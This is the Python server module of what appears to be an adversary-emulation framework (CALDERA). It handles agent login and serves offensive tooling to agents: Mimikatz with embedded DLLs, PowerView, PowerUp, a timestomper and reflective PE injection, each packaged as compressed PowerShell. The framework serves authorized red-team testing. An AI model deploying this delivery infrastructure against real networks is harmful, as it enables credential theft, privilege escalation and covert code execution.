from aiohttp import web
from aiohttp_jinja2 import render_template
import asyncio
import socket
import io
import os
import functools
import pathlib
import inspect
import logging
import base64
import array
from functools import wraps
import json
import mongoengine
from .engine.objects import ObservedDomain, ObservedHost, ObservedFile, ObservedShare, ObservedUser, \
    ObservedCredential, ObservedSchtask, ObservedTimeDelta, ObservedRat
from . import authentication as auth
from .engine.objects import Agent, Host, Domain
from . import formbuilder
from . import interface
from . import powershell
from .util import tz_utcnow, relative_path
from datetime import datetime


log = logging.getLogger(__name__)
commit_id = ''
cagent_conf = ''
additional_views = ''
additional_js = ''
additional_nav_html = ''
with open(relative_path(__file__, '../VERSION')) as version_file:
    version = version_file.read().strip()

routes = []


def api(uri, methods, auth_group=None):
    """This is a decorator for web api endpoints

    Args:
        uri: The URI for the API, can contain keywords denoted by '{}' which indicate
        methods: the list of HTTP methods this API accepts
        auth_group: the group that the token must be in for access to this API
    """
    if auth_group is None:
        auth_group = []

    def decorator(f):
        @wraps(f)
        async def decorated(req, token):
            kwargs = {}

            sig = inspect.signature(f)

            if 'token' in sig.parameters:
                kwargs['token'] = token
            test = f(req, **kwargs)
            if inspect.isawaitable(test):
                return await test
            else:
                return test

        async def entrypoint(req):
            try:
                token = None
                if not auth_group:
                    try:
                        token = auth.Token(req.cookies.get('AUTH'))
                    except auth.NotAuthorized:
                        # if anyone can access this API, we'll still try to see if they have a token, but if they don't
                        # its not an error
                        pass
                else:
                    # ensure this member is authorized
                    token = auth.Token(req.cookies.get('AUTH'))
                    l = [g for g in auth_group if token.in_group(g)]
                    if len(l) == 0:
                        raise auth.NotAuthorized()

                    # active connections
                    peername = req.transport.get_extra_info('peername')
                    if peername is not None:
                        if token.in_group('agent'):
                            agent = Agent.objects.with_id(token.session_info['_id'])
                            if agent is None:
                                raise auth.NotAuthorized

                results = await decorated(req, token)
                if isinstance(results, web.StreamResponse):
                    return results
                else:
                    json_obj = json.dumps(results, sort_keys=True, indent=4)
                    return web.Response(text=json_obj, content_type='application/json')
            except auth.NotAuthorized:
                return web.HTTPForbidden()

        for method in methods:
            routes.append((method, uri, entrypoint))
        return decorated
    return decorator


def get_file_text(script_name):
    return get_file_decode(script_name, lambda x: x.decode('utf-8'))


def get_file_base64(script_name):
    return get_file_decode(script_name, lambda x: base64.b64encode(x).decode('utf-8'))


def get_file_decode(script_name, decode_f):
    cur_path = pathlib.Path(__file__)
    cur_path = cur_path.parents[1].joinpath('files', script_name)

    with cur_path.open('rb') as f:
        contents = f.read()

    # decrypt with key
    key = [0x32, 0x45, 0x32, 0xca]
    arr = array.array('B', contents)

    for i, val in enumerate(arr):
        cur_key = key[i % len(key)]
        arr[i] = val ^ cur_key

    return decode_f(arr.tobytes())


@api('/', methods=['GET'])
async def main(request: web.Request, token):
    # redirect to /login if not logged in
    if not token:
        return web.HTTPFound('/login')

    return render_template('base.html', request, {'version': version, 'commit_id': commit_id,
                                                  'additional_views': additional_views,
                                                  'additional_js': additional_js,
                                                  'additional_nav_html': additional_nav_html})


@api('/login', methods=['GET'])
async def get_login(request: web.Request):
    return render_template('components/login/login.html', request, {})


async def download_file(request, file_path):
    resp = web.StreamResponse()
    resp.content_type = 'application/octet-stream'
    resp.enable_chunked_encoding()
    await resp.prepare(request)

    cur_path = pathlib.Path(__file__)
    cur_path = cur_path.parents[2].joinpath(*file_path)

    with cur_path.open('rb') as f:
        while True:
            # TODO could use ThreadPoolExecutor here for non-blocking I/O
            byte = f.read(io.DEFAULT_BUFFER_SIZE)
            if len(byte) > 0:
                resp.write(byte)
                try:
                    await resp.drain()
                except asyncio.CancelledError:
                    return resp
            if len(byte) != io.DEFAULT_BUFFER_SIZE:
                # eof
                break
    return resp


@api('/login', methods=['POST'])
async def login(request: web.Request):
    json = await request.json()
    token = None
    try:
        if "agent" in json:
            ip, port = request.transport.get_extra_info('peername')
            try:
                lookup_hostname = socket.gethostbyaddr(ip)[0].split(".")[0].lower()
            except socket.herror as herr:
                lookup_hostname = json["hostname"]

            for x in ("fqdn", "hostname", "windows_domain", "dns_domain"):
                if x in json:
                    json[x] = json[x].lower()

            if "hostname" in json:
                if json["hostname"] != lookup_hostname:
                    log.warning("Agent reported hostname as '{}' but it actually is '{}'".format(json["hostname"],
                                                                                                 lookup_hostname))
                    # fix up the fqdn
                    #fqdn = json["fqdn"]
                    #if fqdn.split(".")[0] == json["hostname"]:
                    #    fqdn = [lookup_hostname] + fqdn.split(".")[1:]
                    #    json["fqdn"] = ".".join(fqdn)

                    ## fix up the hostname
                    #json["hostname"] = lookup_hostname
            else:
                json['hostname'] = lookup_hostname

            domain_dict = {k: json[k] for k in ('windows_domain', 'dns_domain')}
            domain = Domain.objects(**domain_dict)
            if len(domain) == 0:
                domain = Domain(**domain_dict).save()
            else:
                domain = domain[0]

            host = Host.objects(fqdn=json['fqdn'])
            if len(host) == 0:
                host = Host(hostname=json['hostname'],
                            status="active",
                            IP=ip,
                            last_seen=tz_utcnow(),
                            fqdn=json['fqdn'],
                            domain=domain).save()
            else:
                host = host[0]
                host.update(last_seen=tz_utcnow())

            agent = Agent.objects(host=host.id)
            if len(agent) == 0:
                agent = Agent(host=host.id, alive=True, check_in=datetime.now()).save()
            else:
                agent = agent[0]
            token = auth.login_generic(["agent"], {'_id': agent.id})
        else:
            token = auth.login_user(json['username'], json['password'])
    except KeyError:
        token = None

    if token is not None:
        resp = web.Response(text=token)
        resp.set_cookie('AUTH', token)
    else:
        resp = web.HTTPUnauthorized()
    return resp


@api('/logout', methods=['POST'])
async def logout(request: web.Request):
    resp = web.Response()
    resp.del_cookie('AUTH')
    return resp


@api('/macro/powerkatz', methods=['GET'], auth_group=['human', 'agent'])
async def download_powerkatz(request: web.Request):
    powerkatz_base = get_file_text("invoke-mimi-ps1")
    powerkatz = powerkatz_base.replace("[[MIMIKATZ_64_PLACEHOLDER]]", get_file_base64("mimi64-dll"))
    powerkatz = powerkatz.replace("[[MIMIKATZ_32_PLACEHOLDER]]", get_file_base64("mimi32-dll"))
    compressed = powershell.ps_compressed(powerkatz, var_name='expr')
    stdin = ''.join(compressed) + powershell.remote_endl
    resp = web.Response()
    resp.text = stdin
    return resp


@api('/macro/powerview', methods=['GET'], auth_group=['human', 'agent'])
async def download_powerview(request: web.Request):
    powerview = get_file_text("powerview-ps1")
    compressed = powershell.ps_compressed(powerview, var_name='expr')
    stdin = ''.join(compressed) + powershell.remote_endl
    resp = web.Response()
    resp.text = stdin
    return resp


@api('/macro/powerup', methods=['GET'], auth_group=['human', 'agent'])
async def download_powerup(request: web.Request):
    powerview = get_file_text("powerup-ps1")
    compressed = powershell.ps_compressed(powerview, var_name='expr')
    stdin = ''.join(compressed) + powershell.remote_endl
    resp = web.Response()
    resp.text = stdin
    return resp


@api('/macro/timestomper', methods=['GET'], auth_group=['human', 'agent'])
async def download_timestomper(request: web.Request):
    powerview = get_file_text("timestomper-ps1")
    compressed = powershell.ps_compressed(powerview, var_name='expr')
    stdin = ''.join(compressed) + powershell.remote_endl
    resp = web.Response()
    resp.text = stdin
    return resp


@api('/macro/reflectivepe.{filename}', methods=['GET'], auth_group=['human', 'agent'])
async def download_generated_reflective_pe_script(request: web.Request):
    # Parse PE file name from uri
    pe_file_name = request.match_info['filename']

    # Get content of script and pe file
    powersploit_script = get_file_text("invoke-reflectivepe-ps1")
    encoded_pe = get_file_base64(pe_file_name)

    # Create a new powershell script with Invoke-ReflectivePEInjection and a b64'd PE file and return it to the client.
    prototype = '{script}{endl}$EncodedPE = "{b64pe}"{endl}$DecodedPE = [Byte[]][Convert]::FromBase64String($EncodedPE)'
    built = prototype.format(script=powersploit_script, endl=powershell.remote_endl, b64pe=encoded_pe)
    compressed = powershell.ps_compressed(built, var_name='expr')
    stdin = ''.join(compressed) + powershell.remote_endl
    resp = web.Response()
    resp.text = stdin
    return resp


def translate_field(field):
    if isinstance(field, mongoengine.fields.StringField):
        return "string"
    elif isinstance(field, mongoengine.fields.BooleanField):
        return "bool"
    elif isinstance(field, mongoengine.fields.DateTimeField):
        return "datetime"
    elif isinstance(field, mongoengine.fields.ReferenceField):
        return {"ref": field.document_type._class_name}
    elif isinstance(field, mongoengine.fields.ObjectIdField):
        return "id"
    elif isinstance(field, mongoengine.fields.ListField):
        return {"list": translate_field(field.field)}
    elif isinstance(field, mongoengine.fields.IntField):
        return "int"
    else:
        raise Exception


def build_schema_description():
    schema = {}
    for coll in [ObservedDomain, ObservedHost, ObservedFile, ObservedShare, ObservedUser,
                 ObservedCredential, ObservedSchtask, ObservedTimeDelta, ObservedRat]:
        schema[coll._class_name] = {k: translate_field(v) for k, v in coll._fields.items()}

    return schema


@api('/schema', methods=['GET'])
async def schema_request(request):
    schema = build_schema_description()
    return web.Response(text=json.dumps(schema, indent=4))


@api('/conf.yml', methods=["GET"])
async def cagent_conf_request(request):
    return web.Response(body=cagent_conf.encode('ascii'), content_type='application/octet-stream')


@api('/deflate_token', methods=["GET"])
async def deflate_token(request, token):
    if token:
        return token.session_info
    else:
        return None


def init(app):
    # assemble routes for static objects
    def add_rsrc(rsrc):
        script_dir = os.path.dirname(__file__)
        www_rel_path = "../www/static/"
        abs_www_path = os.path.join(script_dir, www_rel_path)

        app.router.add_static('/' + rsrc, abs_www_path + rsrc)

    add_rsrc('css')
    add_rsrc('fonts')
    add_rsrc('image')
    add_rsrc('js')

    # generated views
    html, js, nav_html = formbuilder.generate_whole_html('sendVagentCommand', 'Send Agent Command',
                                                         [interface.agent_shell_command,
                                                          interface.create_process,
                                                          interface.create_process_as_active_user,
                                                          interface.create_process_as_user, interface.get_clients])
    global additional_views
    global additional_js
    global additional_nav_html
    additional_views += html
    additional_js += js
    additional_nav_html += nav_html

    api('/agent', methods=['GET'], auth_group=['human', 'agent'])(
        functools.partial(download_file, file_path=('dep', 'caldera-agent', 'caldera_agent', 'dist', 'cagent.exe')))
    api('/commander', methods=['GET'], auth_group=['human', 'agent'])(
         functools.partial(download_file, file_path=('dep', 'crater', 'crater', 'CraterMain.exe')))

    for method, uri, func in routes:
        app.router.add_route(method, uri, func)
